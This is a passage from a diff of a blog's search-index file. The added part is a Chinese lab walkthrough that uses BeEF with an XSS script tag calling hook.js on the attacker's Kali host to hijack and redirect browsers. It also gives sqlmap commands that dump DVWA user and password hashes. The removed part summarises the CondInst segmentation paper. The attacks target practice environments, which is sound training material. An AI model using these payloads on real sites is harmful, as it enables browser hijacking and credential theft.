+<img src="https://img-blog.csdnimg.cn/20201117130248992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+我把账号和密码都修改为了beeff，之后保存退出。再输入 <code>./beef</code></p>
+<ul>
+<li>使用默认用户可能会导致你安装失败<br>
+输入<code>su</code>然后输入root密码，切换为root权限，然后再输入<code>./beef</code><br>
+<img src="https://img-blog.csdnimg.cn/20201117130624794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+会提示你现在已经启动了，然后打开kali中自带的firefox浏览器。进入到：<br>
+<code>http://127.0.0.1:3000/ui/authentication</code><br>
+<img src="https://img-blog.csdnimg.cn/2020111713111126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+输入你刚才设置的账号和密码，就可以成功的登陆了。</li>
+</ul>
+<p>访问一下hook.js里面有自带的恶意代码<br>
+<img src="https://img-blog.csdnimg.cn/2020111713564093.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+只要访问到这个网站，对方的浏览器就会被劫持。</p>
+<h3 id="1x04-XSS注入漏洞"><a class="header-anchor" href="#1x04-XSS注入漏洞">¶</a>1x04 XSS注入漏洞</h3>
+<h4 id="2x01-XSS劫持网站"><a class="header-anchor" href="#2x01-XSS劫持网站">¶</a>2x01 XSS劫持网站</h4>
+<p>现在使用自己的本机访问留言簿的网站，并将XSS注入恶意代码。<br>
+XSS注入代码如下：<br>
+<code>&lt;script src=&quot;http://Kali的IP地址:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20201117140452295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+现在进入到这个当中我们可以发现已经成功了，而且看不到刚才写的代码，说明代码已经被成功的加载进去了！<br>
+<img src="https://img-blog.csdnimg.cn/20201117140446773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+刷新一下界面，可以发现会有一个弹框：<br>
+<img src="https://img-blog.csdnimg.cn/20201117140649183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+然后再回到kali里面的beef管理界面看一下，可以发现10.34.80.1也就是我的本机已经被劫持了！<br>
+<img src="https://img-blog.csdnimg.cn/20201117140922301.png#pic_center" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/20201117141052958.png#pic_center" alt="在这里插入图片描述"><br>
+可以使用他干一些奇怪的事情，还有查询一些信息<br>
+<img src="https://img-blog.csdnimg.cn/20201117142326400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h4 id="2x02-劫持浏览器指定被劫持网站为学校主页"><a class="header-anchor" href="#2x02-劫持浏览器指定被劫持网站为学校主页">¶</a>2x02 劫持浏览器指定被劫持网站为学校主页</h4>
+<p><img src="https://img-blog.csdnimg.cn/20201117150244138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+在命令中选择，Redirect Browser，填入学校地址，然后点击Execute。就可以发现网页被重定向了。</p>
+<p>本次实验中的XSS攻击属于注入型XSS攻击。</p>
+<h2 id="0x02-SQL注入（DVWA-SQLMAP-Mysql）"><a class="header-anchor" href="#0x02-SQL注入（DVWA-SQLMAP-Mysql）">¶</a>0x02 SQL注入（DVWA+SQLMAP+Mysql）</h2>
+<h3 id="1x01-实验环境搭建"><a class="header-anchor" href="#1x01-实验环境搭建">¶</a>1x01 实验环境搭建</h3>
+<p>打开Metasploitable2后，里面有搭建好的DVWA，访问<code>http://Metasploitable的IP/dvwa</code>即可<br>
+<img src="https://img-blog.csdnimg.cn/20201117161430968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+在low级别的SQL Injection中进行SQL注入的尝试：<br>
+输入1，可以正常显示：<br>
+<img src="https://img-blog.csdnimg.cn/20201117161631674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+输入1’ 报错<br>
+可以判断此处有报错：<br>
+<img src="https://img-blog.csdnimg.cn/20201117161723620.png#pic_center" alt="在这里插入图片描述"><br>
+下面使用sqlmap进行攻击</p>
+<p><strong>SQLMAP基本语法</strong>：</p>
+<ul>
+<li>-u:指定目标URL</li>
+<li>–cookie：当前会话的cookies值</li>
+<li>-b：获取数据库类型，检查数据库管理系统标识</li>
+<li>–current-db：获取当前数据库</li>
+<li>–current-user：获取当前数据库使用的用户</li>
+<li>-string：当查询可用来匹配页面中的字符串</li>
+<li>-users：枚举DBMS用户</li>
+<li>-password：枚举DBMS用户密码hash</li>
+</ul>
+<h3 id="1x02-枚举当前数据库名称和用户名"><a class="header-anchor" href="#1x02-枚举当前数据库名称和用户名">¶</a>1x02 枚举当前数据库名称和用户名</h3>
+<p>查询一下当前的数据库：<br>
+<code>sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; --current-db</code></p>
+<ul>
+<li>-u后是需要攻击的url</li>
+<li>因为dvwa是需要登陆的，需要cookie用作身份验证，可以通过浏览器F12抓包获取</li>
+<li>–current-db表示查询当前数据库<br>
+<img src="https://img-blog.csdnimg.cn/20201117163655704.png#pic_center" alt="在这里插入图片描述"><br>
+然后查询一下当前的使用者：<br>
+<code>sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; --current-user </code><br>
+<img src="https://img-blog.csdnimg.cn/2020111716382474.png#pic_center" alt="在这里插入图片描述"></li>
+</ul>
+<h3 id="1x03-枚举数据库用户名和密码"><a class="header-anchor" href="#1x03-枚举数据库用户名和密码">¶</a>1x03 枚举数据库用户名和密码</h3>
+<p><strong>枚举数据库的表名：</strong></p>
+<p>因为我们是dvwa所以爆破dvwa数据库中的数据表</p>
+<p><code>sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; -D dvwa --tables </code><br>
+<img src="https://img-blog.csdnimg.cn/20201117164551451.png#pic_center" alt="在这里插入图片描述"><br>
+<strong>枚举数据表中的列名：</strong><br>
+根据上面的枚举结果，我们应该是要看users数据表中的内容：<br>
+<code>sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; -D dvwa -T users --columns </code><br>
+<img src="https://img-blog.csdnimg.cn/20201117164855105.png#pic_center" alt="在这里插入图片描述"><br>
+<strong>枚举数据表中的用户和密码：</strong><br>
+查询到users数据表中有那么多的字段，我们想要的数据应该就在user和password中了<br>
+<code>sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; -D dvwa -T users -C user,password --dump </code><br>
+这里会询问你是否使用Kali中自带的字典进行攻击，选择是就好了<br>
+<img src="https://img-blog.csdnimg.cn/20201117165159959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+最后得到结果：<br>
+<img src="https://img-blog.csdnimg.cn/20201117165304520.png#pic_center" alt="在这里插入图片描述"></p>
 ]]></content>
       <categories>
-        <category>CV</category>
+        <category>security</category>
       </categories>
       <tags>
-        <tag>CV</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【论文阅读】Conditional Convolutions for InstanceSegmentation</title>
-    <url>/2020/10/30/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91Conditional-Convolutions-for-InstanceSegmentation/</url>
-    <content><![CDATA[<h1>0x01 概要</h1>
-<p>Mask R-CNN等性能最好的实例分割方法依赖于ROI操作（通常是ROIPool或roalign）来获得最终的实例掩码。相比之下，我们建议从一个新的角度来解决站姿分割问题。我们不使用实例级roi作为固定权重网络的输入，而是使用基于实例的动态感知网络。CondInst有两个优点：1）通过完全卷积网络。</p>
-<a id="more"></a>
-<p>CondInst有两个优点：<br>
-1）通过完全卷积网络解决实例分割，消除了ROI裁剪和特征对齐的需要；<br>
-2）由于动态生成条件卷积的能力大大提高，掩模头可以非常紧凑（例如，3转换层，每个只有8个通道），导致明显更快的推断。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201030000730950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h1>0x02 Mask-RCNN的缺点</h1>
-<p>实例分割是计算机视觉中的一项基本而又具有挑战性的任务，它需要一种算法来预测图像中每个感兴趣的实例的每像素掩模。尽管最近提出了一些工作，但实例分割的主流框架仍然是两阶段方法Mask R-CNN，它将实例分割转化为两阶段的检测和分割任务。Mask R-CNN首先使用一个更快的对象检测器R-CNN来预测每个实例的边界框。然后在每个实例中，使用roiallign操作从网络的特征图中裁剪出感兴趣的区域（roi）。为了预测每个实例的最终掩模，将一个紧凑的全卷积网络（FCN）（即掩模头）应用到这些roi上，以执行前景/背景分割。</p>
-<p>1） 由于ROI通常是轴对齐的边界框，对于形状不规则的对象，它们可能包含大量不相关的图像内容，包括背景和其他实例。这个使用旋转roi可以缓解这个问题，但代价是更复杂的管道。</p>
-<p>2） 为了区分前景实例和背景内容或实例，掩码头需要一个相对较大的接受域来编码足够大的上下文信息。因此，在掩模头中需要一组3×3的卷积（例如，掩模R-CNN中有4个3×3卷积，256个通道）。它大大增加了掩模头的计算复杂度，导致推理时间在实例数上有显著变化。</p>
-<p>3） ROI的大小通常不同。为了在现代深度学习框架中使用有效的批处理计算，通常需要调整大小操作来将裁剪区域调整为相同大小的补丁。例如，Mask R-CNN会将所有裁剪区域的大小调整为14×14（使用反褶积将采样率提高到28×28），这限制了实例分段的输出分辨率，因为大型实例需要更高的分辨率来保留边界的细节</p>
-<h1>0x03 为什么FCNs在实例分割上的效果不好</h1>
-<p>我们发现，将模糊神经网络应用于实例分割的主要困难在于相似图像的出现可能需要不同的预测，但FCNs难以实现这一点。例如，如果在一个input image中有两个外观相似的人A和B，那么在预测A的实例掩码时，FCN需要将B预测为background w.r.t.A，这可能很困难，因为它们在外观。因此，ROI操作用于裁剪感兴趣的人，即A；并过滤掉B，实例分段需要两种类型的in队形：</p>
-<p>1） 用于对对象进行分类的外观信息；</p>
-<p>2）用于区分属于同一类别的多个对象的位置信息。几乎所有的方法都依赖于ROI裁剪，对实例的位置信息进行显式编码。相比之下，CondInst通过使用敏感卷积滤波器以及显示在特征地图上的相对坐标来利用位置信息。</p>
-<p>因此，我们提倡一种新的解决方案，即使用实例感知FCNs进行实例任务预测。换言之，与使用一组固定卷积滤波器的标准ConvNet作为掩码头来预测所有实例，而是根据要预测的实例来调整网络参数。在动态过滤网络[20]和CondConv[41]的启发下，对于每个实例，控制器子网络（见图3）动态生成掩码FCN网络参数（以实例的中心区域为条件），然后使用该参数预测该实例的掩码。预计网络参数可以对该实例的特征（例如相对位置、形状和外观）进行编码，并且只对该实例的像素进行激发，从而绕过了上述困难。这些条件掩模头被应用到整个特征映射中，消除了对ROI操作的需要。乍一看，这个想法可能行不通，因为如果某些图像包含多达几十个实例，则实例掩码头可能会产生大量的网络参数。然而，我们发现，一个非常紧凑的FCN掩模头和动态生成的滤波器已经可以优于先前基于ROI的mask R-CNN，从而大大降低了Mask-CNN中掩模头的每一瞬间的计算复杂度。</p>
-<h1>0x04 主要贡献</h1>
-<ul>
-<li>试图从一个新的角度来解决实例分割问题。为此，我们提出了CondInst实例分割框架，该框架比现有的Mask R-CNN等方法在提高实例分割速度的同时，提高了实例分割的性能。据我们所知，这是第一次一个新的实例分割框架在精确度和速度上都优于最新的技术</li>
-<li>CondInst是完全卷积的，并且避免了许多现有方法中使用的上述调整大小操作，因为CondInst不依赖ROI。不必调整特征图的大小，就可以获得高分辨率的分辨率，并具有更精确的边缘。</li>
-<li>与以前的方法不同，一旦训练完所有实例，掩码头中的过滤器都是固定的，而我们的掩码头中的过滤器是动态生成的，并根据实例进行调整。因此，只需记住一个过滤器，就可以大大减少所要求的过滤器的负载。因此，Mask head 可以非常轻量，显著减少推理时间。与bounding box检测器FCOS相比，CondInst只需要多10%的计算时间，甚至可以处理每个图像的最大实例数（即100个实例）。</li>
-</ul>
-<h1>0x05 CondInst的实例分割</h1>
-<h2 id="1x01-网络总体结构"><a class="header-anchor" href="#1x01-网络总体结构">¶</a>1x01 网络总体结构</h2>
-<p>回想一下mask R-CNN使用一个对象检测器来预测输入图像中实例的边界框。边界框实际上就是掩码R-CNN表示实例的方式。类似地，CondInst使用实例感知过滤器来表示实例。换句话说，CondInst没有将实例概念编码到边界框中，而是隐式地将其编码到掩码头的参数中，这是一种更灵活的方式。例如，它可以很容易地表示不规则的形状，而这些不规则形状是很难被表示的,）被边界框紧紧包围。这是CondInst相对于以前基于ROI的方法的优势之一。</p>
-<p>与基于ROI的方法获取边界框的方式类似，实例感知滤波器也可以通过对象检测器获得。在这项工作中，由于CondInst的简单性和灵活性，CondInst在流行的目标检测器FCOS上构建CondInst。同时，在FCOS中消除锚盒也可以节省参数的数目和条件的计算量。如图</p>
-<p><img src="https://img-blog.csdnimg.cn/20201030005947312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
-利用特征金字塔网络的特征映射{P3、P4、P5、P6、P7}，其下采样率分别为8、16、32、64和128。如图3所示，在FPN的每个特征层上，应用一些功能层（在虚线框中）来进行实例相关的预测。例如，目标实例的类和实例的动态生成的筛选器。从这个意义上讲，CondInst可以看作是Mask R-CNN，它们都是先处理图像中的实例，然后预测实例的像素级掩码（即实例优先），除了检测器，如图所示，还有一个掩模分支，<strong>它提供了我们生成的掩码头作为输入来预测所需实例掩码的特征映射。</strong></p>
-<p>特征图表示为：<br>
-<img src="https://img-blog.csdnimg.cn/20201030012049379.png#pic_center" alt="在这里插入图片描述"><br>
-掩模分支连接到FPN level p3，因此其输出分辨率为输入图像分辨率的18。掩模分支在最后一层之前有四个3×3的卷积，有128个通道。之后，为了减少生成参数的数量，掩码分支的最后一层将信道数从128减少到8（即，Cmask＝8）。令人惊讶的是，使用cmask=8已经可以获得优异的性能，而使用更大的cmask（例如16）并不能提高性能，如我们的实验所示。更严重的是，使用cmask=2只会使mask AP的性能降低0.3%。此外，如图3所示，fmaski与坐标图相结合，这些坐标是fmask上所有位置到位置（x，y）的相对坐标（即，生成遮罩头的滤波器的位置）。然后，将组合发送到掩码头以预测实例掩码。如我们的实验所示，相对坐标为预测实例掩模提供了强有力的线索。此外，单个sigmoid被用作掩模头的最终输出，因此掩模预测是类无关的。<strong>实例的类别由分类头与控制器并行预测。</strong></p>
-<p>原始掩模预测的分辨率与F mask的分辨率相同，后者是输入图像分辨率的八分之一。为了产生高分辨率的实例掩模，使用双线性上采样将maskprediction上采样到4，得到400×512掩模预测（如果输入图像大小为800×1024）。我们将在实验中证明上采样对CondInst的最终瞬间分段性能至关重要。需要注意的是，该掩模的分辨率比掩模R-CNN（如前所述仅为28×28）高得多。</p>
-<h2 id="1x02-网络输出和训练标签"><a class="header-anchor" href="#1x02-网络输出和训练标签">¶</a>1x02 网络输出和训练标签</h2>
-<p>CondInst 具有如下的输出头：</p>
-<ul>
-<li>
-<p>Classiofication Head：<br>
-分类头预测实例的分类，ground-truth标签为类别信息或者0（背景）即背景）。在FCOS中，网络预测一个C-D vector <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{x,y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>用于分类，每个元素在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{x,y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>对应于一个二进制分类器，其中C表示类别的数量。</p>
-</li>
-<li>
-<p>Controller  Head<br>
-控制器头与上述分类头具有相同的结构，用于预测该位置实例的Mask head的参数。Mask head 预测这个物体Mask。为了预测参数，我们将滤波器的所有参数（即权重和偏差）串联在一起作为一个N-D向量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>θ</mi><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\theta_{x,y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，其中N是参数的总数。因此，控制器头部没有输出信道。掩模头是一种非常紧凑的fcn结构，它有三个1×1的卷积，每个卷积有8个通道，除了最后一个外，都使用ReLU作为激活函数。这里没有使用诸如批处理规范化之类的规范化层。最后一层有1个输出信道，使用sigmoid来预测前景的概率。任务头总共有169个参数（#权重=（8+2）×8（conv1）+8×8（conv2）+8×1（conv3）和#biaes=8（conv1）+8（conv2）+1（conv3））。如前所述，生成的过滤器包含关于实例所在位置的信息，因此，理想情况下，带有过滤器的遮罩头将只对实例的像素点进行触发，甚至将整个特征映射作为输入。</p>
-</li>
-<li>
-<p>Center-ness  and  Box  Heads.<br>
-从概念上讲，CondInst可以消除box head，因为CondInst不需要ROIs。然而，我们发现如果使用基于Box的NMS，推理时间将大大减少。因此，我们仍然预测CondInst中的Box。我们要强调的是，预测框仅在NMS中使用，不涉及任何ROI操作。</p>
-</li>
-</ul>
-<h2 id="1x03-损失函数"><a class="header-anchor" href="#1x03-损失函数">¶</a>1x03 损失函数</h2>
-<p><img src="https://img-blog.csdnimg.cn/20201030062801683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
-<img src="https://img-blog.csdnimg.cn/20201030063548336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="1x04-推理"><a class="header-anchor" href="#1x04-推理">¶</a>1x04 推理</h2>
-<p>给定一幅输入图像，通过网络进行转发，得到包含分类置信度的输出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{x,y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>, 中心度得分，box预测 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">t_{x,y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9011879999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>和生成的参数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>θ</mi><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\theta_{x,y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>, 我们首先按照FCOS中的步骤来获得Box。然后，使用阈值为0.6的基于Box的NMS来消除重复检测，然后使用前100个框计算掩码。与FCOS不同，这些方框还与控制器生成的过滤器相关联。让我们假设在NMS之后还有K个box，因此我们有生成的K个过滤器组。这一组滤波器用于产生特定于实例的Mask-head。这些特定于实例的掩码头以FCNs的方式应用于与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">F_{x,y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>（即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mrow><mi>m</mi><mi>a</mi><mi>s</mi><mi>k</mi></mrow></msub></mrow><annotation encoding="application/x-tex">F_{mask}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight">s</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">O_{x,y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" 